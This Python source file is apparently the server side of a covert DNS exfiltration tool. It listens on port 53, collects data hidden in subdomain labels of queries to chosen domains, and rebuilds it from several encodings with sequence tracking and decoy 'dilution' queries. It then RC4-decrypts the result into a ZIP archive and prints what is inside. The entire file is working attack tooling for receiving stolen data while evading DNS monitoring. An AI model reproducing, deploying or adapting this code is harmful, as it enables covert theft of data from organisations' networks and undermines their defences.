#!/usr/bin/python
# -*- coding: utf8 -*-

import math
import statistics
import sys
import argparse
import socket
from dnslib import *
from base64 import b64decode, b32decode
import os
import zipfile
import random
import time
import traceback
import tldextract
from collections.abc import Generator

# ======================================================================================================
# RC4 CLASS
# ======================================================================================================
class RC4:
    def __init__(self, key=None):
        self.state = list(range(256))
        self.x = self.y = 0
        if key is not None:
            self.key = key
            self.init(key)

    def init(self, key):
        for i in range(256):
            self.x = (ord(key[i % len(key)]) + self.state[i] + self.x) & 0xFF
            self.state[i], self.state[self.x] = self.state[self.x], self.state[i]
        self.x = 0

    def binaryDecrypt(self, data):
        output = [None] * len(data)
        for i in range(len(data)):
            self.x = (self.x + 1) & 0xFF
            self.y = (self.state[self.x] + self.y) & 0xFF
            self.state[self.x], self.state[self.y] = self.state[self.y], self.state[self.x]
            output[i] = (data[i] ^ self.state[(self.state[self.x] + self.state[self.y]) & 0xFF])
        return bytearray(output)

# ======================================================================================================
# HELPER FUNCTIONS
# ======================================================================================================

def should_dilute(lcg, probability):
    return next(lcg) % 100 < probability * 100

def lcg(modulus: int, a: int, c: int, seed: int) -> Generator[int, None, None]:
    """Linear congruential generator."""
    while True:
        seed = (a * seed + c) % modulus
        yield seed

def progress(count, total, status=''):
    bar_len = 60
    filled_len = int(round(bar_len * count / float(total)))
    percents = round(100.0 * count / float(total), 1)
    bar = '=' * filled_len + '-' * (bar_len - filled_len)
    sys.stdout.write('[%s] %s%s\t%s\t\r' % (bar, percents, '%', status))


def fromBase32Map(msg):
    """Decode base32map-encoded message (word format)."""
    clean_msg = msg.replace('.', '')
    base32Alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'
    word_map = [
        "kit", "van", "web", "you", "for", "set", "big", "fin",
        "sly", "app", "get", "hot", "mix", "dug", "ace", "arm",
        "era", "red", "led", "not", "hut", "car", "pen", "man",
        "she", "all", "sin", "leo", "sir", "run", "cut", "chi"
    ]

    base32_string = ''
    index = 0
    while index < len(clean_msg):
        word = clean_msg[index:index+3]
        if word in word_map:
            word_index = word_map.index(word)
            base32_string += base32Alphabet[word_index]
        else:
            raise ValueError(f"Invalid base32map word: {word}")
        index += 3

    return fromBase32(base32_string)

def fromBase32(string):
    """Decode standard Base32 string."""
    mod = len(string) % 8
    padding = {2: "======", 4: "====", 5: "===", 7: "="}.get(mod, "")
    return b32decode(string.upper() + padding)

def fromBase64(string):
    """Decode Base64 string (with URL-safe character handling)."""
    string = string.replace('-', '+').replace('_', '/')
    mod = len(string) % 4
    padding = {1: "===", 2: "==", 3: "="}.get(mod, "")
    return b64decode(string + padding)

def fromHex(string):
    """Decode hexadecimal string."""
    return bytes.fromhex(string)

def color(string, color=None):
    """Change text color for the Linux terminal."""
    attr = ['1']
    if color:
        if color.lower() == "red": attr.append('31')
        elif color.lower() == "green": attr.append('32')
        elif color.lower() == "blue": attr.append('34')
    else:
        if string.strip().startswith("[!"): attr.append('31')
        elif string.strip().startswith("[+"): attr.append('32')
        elif string.strip().startswith("[?"): attr.append('33')
        elif string.strip().startswith("[*"): attr.append('34')
    return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)

def entropy(text):
    prob = [float(text.count(c)) / len(text) for c in dict.fromkeys(list(text))]
    return - sum([p * math.log(p) / math.log(2.0) for p in prob])

# ======================================================================================================
# MAIN FUNCTION
# ======================================================================================================

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='DNS Exfiltration Server')
    parser.add_argument("-f", "--domain-file", help=".txt file of domains used to exfiltrate data (one each line)",
                        dest="domainFile", required=True)
    parser.add_argument("-p", "--password", help="The password used to encrypt/decrypt exfiltrated data",
                        dest="password", required=True)
    parser.add_argument("-o", "--output", help="The name of the resulting file",
                        dest="outputFileName", required=True)
    parser.add_argument("-s", "--seq", help="Sequence number mode", dest="seq_mode", required=True)
    args = parser.parse_args()


    entropies = []
    udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udps.bind(('', 53))

    domains = []
    with open(args.domainFile, 'r') as f:
        domains = [line.strip() for line in f if line.strip()]

    seq_mode = args.seq_mode.upper()
    if seq_mode not in ["PLAIN", "ENC", "LCR"]:
        print(f"Sequence mode {seq_mode} not supported.")
        exit

    print(color("[*] DNS Exfiltration Server"))
    print(color("[*] Listening on port 53"))
    print(color(f"[*] Domains: {domains}"))
    print(color(f"[*] Sequence Mode: {seq_mode}"))
    print(color("[*] Supported encodings: base32map (0), base32 (1), base64 (2), hex (3)"))

    try:
        requestIndex = 0
        fileData = ''
        encoding_type = None
        totalRequests = 0
        initBuffer = ''
        init_complete = False

        base32Alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'

        map_words = ["kit", "van", "web", "you", "for", "set", "big", "fin",
                     "sly", "app", "get", "hot", "mix", "dug", "ace", "arm",
                     "era", "red", "led", "not", "hut", "car", "pen", "man",
                     "she", "all", "sin", "leo", "sir", "run", "cut", "chi"]

        chunk_words = ["fox", "dog", "cat", "bat", "owl", "ant", "bee", "fly",
                       "cow", "pig", "rat", "hen", "ram", "eel", "elk", "jay",
                       "cod", "doe", "ewe", "pup", "cub", "pod", "bud", "oak",
                       "elm", "ash", "fir", "ivy", "ore", "gem", "tin", "ion",
                       "gas", "oil", "ice", "mud", "fog", "dew", "sun", "sky",
                       "sea", "bay", "dam", "pit", "rod", "axe", "bow", "net",
                       "oar", "urn"]

        encoding_map = {
            '0': 'base32map',
            '1': 'base32',
            '2': 'base64',
            '3': 'hex'
        }

        while True:
            data, addr = udps.recvfrom(1024)
            request = DNSRecord.parse(data)

            print(color("[+] Received query: [{}] - Type: [{}]".format(
                request.q.qname, request.q.qtype)))

            if request.q.qtype == 1:
                qname = str(request.q.qname)
                extracted = tldextract.extract(qname.rstrip('.'))
                subdomain = extracted.subdomain
                labels = subdomain.split('.') if subdomain else []

                if extracted.top_domain_under_public_suffix not in domains:
                    print(color(f'[!] Domain {extracted.domain} not in allowed list, ignoring'))
                    continue

                # INIT message - NO chunk_word
                if len(labels) == 1:
                    if not init_complete:
                        print(color('[*] Detected INIT request'))
                        initBuffer += labels[0]
                        print(color(f'[*] Init buffer: {initBuffer} ({len(initBuffer)} chars)'))
                        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                        reply.add_answer(RR(request.q.qname, QTYPE.A, rdata=A(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"), ttl=60))
                        udps.sendto(reply.pack(), addr)
                        print(color("[*] Init not complete, waiting for more..."))
                    else:
                        print()
                        print(color("[*] Received Dilution query..."))
                        print()
                        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                        reply.add_answer(RR(request.q.qname, QTYPE.A, rdata=A(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"), ttl=60))
                        udps.sendto(reply.pack(), addr)

                # DATA chunks - HAS chunk_word
                elif len(labels) >= 2:

                    if not init_complete:
                        msg = fromBase32Map(initBuffer).decode('utf-8')
                        encoding_num, totalRequests_str = msg.split('|')
                        totalRequests = int(totalRequests_str)
                        seq_number_generator = lcg((pow(2, 31) - 1), 16807, 0, totalRequests)
                        dil_decision_generator = lcg((pow(2, 31) - 1), 16807, 0, totalRequests + 1)

                        if encoding_num in encoding_map:
                            encoding_type = encoding_map[encoding_num]

                            print(color(f"[+] Init complete: {msg}"))
                            print(color(f"[+] Encoding: {encoding_type} ({encoding_num})"))
                            print(color(f"[+] Number of requests: {totalRequests}"))

                            fileData = ''
                            requestIndex = 0
                            entropies = []
                            initBuffer = ''
                            init_complete = True
                        else:
                            print(color(f"[!] Invalid encoding number: {encoding_num}"))
                            initBuffer = ''


                    if encoding_type is None:
                        print(color("[!] Error: Received data before init"))
                        continue

                    seq_segment = labels[0]
                    if seq_mode == "ENC":
                        requestNumber = chunk_words.index(seq_segment)
                    else:
                        requestNumber = int(seq_segment)

                    if seq_mode == "ENC":
                        seq_number = next(seq_number_generator) % len(chunk_words)
                    elif seq_mode == "LCR":
                        seq_number = next(seq_number_generator) % 256
                    else:
                        seq_number = requestIndex % 256

                    if int(requestNumber) == seq_number:
                         # Data is in second label
                        rawData = labels[1]
                        currentEntropy = entropy(rawData)
                        entropies.append(currentEntropy)

                        # Simply append raw data (already in correct encoding)
                        fileData += rawData

                        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                        reply.add_answer(RR(request.q.qname, QTYPE.A, rdata=A(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{seq_number}")))
                        udps.sendto(reply.pack(), addr)

                        requestIndex += 1
                        progress(requestIndex, totalRequests, "Receiving")


                        # All requests received?
                        if requestIndex == totalRequests:
                            print(color('\n[+] All requests received!'))
                            print(color(f'[*] Average entropy: {statistics.mean(entropies):.2f}'))

                            try:
                                args.outputFileName = args.outputFileName + ".zip"
                                print(color("[+] Decrypting and saving to [{}]".format(args.outputFileName)))

                                # Decode based on encoding type
                                if encoding_type == 'base32':
                                    decoded = fromBase32(fileData)
                                elif encoding_type == 'base64':
                                    decoded = fromBase64(fileData)
                                elif encoding_type == 'hex':
                                    decoded = fromHex(fileData)
                                else:  # base32map
                                    # Convert word-mapped data to base32 string first
                                    base32_string = ''
                                    index = 0
                                    while index < len(fileData):
                                        word = fileData[index:index+3]
                                        if word in map_words:
                                            base32_string += base32Alphabet[map_words.index(word)]
                                        index += 3

                                    mod = len(base32_string) % 8
                                    padding = {2: "======", 4: "====", 5: "===", 7: "="}.get(mod, "")
                                    decoded = b32decode(base32_string + padding)

                                rc4Decryptor = RC4(args.password)
                                content = rc4Decryptor.binaryDecrypt(bytearray(decoded))

                                with open(args.outputFileName, 'wb') as f:
                                    f.write(content)

                                print(color("[+] File saved successfully"))

                                if zipfile.is_zipfile(args.outputFileName):
                                    print(color('[+] Extracting ZIP content:'))
                                    with zipfile.ZipFile(args.outputFileName) as z:
                                        for filename in z.namelist():
                                            print(color(f'[*] File in ZIP: {filename}'))
                                            if not os.path.isdir(filename):
                                                with z.open(filename) as f:
                                                    content_preview = f.read()[:500]
                                                    try:
                                                        print(content_preview.decode('utf-8', errors='ignore'))
                                                    except:
                                                        print(f"[Binary file, size: {len(content_preview)} bytes]")
                                else:
                                    print(color("[!] Warning: Not a valid ZIP file"))

                            except Exception as e:
                                print(color(f"[!] Error: {str(e)}"))
                                traceback.print_exc()

                            # Reset
                            encoding_type = None
                            fileData = ''
                            requestIndex = 0
                    else:
                        print(color(f"[!] Out of order request: expected {seq_number}, got {requestNumber}"))
                else:
                    print(color(f"[!] Unknown request format, labels: {labels}"))

    except KeyboardInterrupt:
        pass
    finally:
        print(color("\n[!] Stopping DNS Server"))
        udps.close()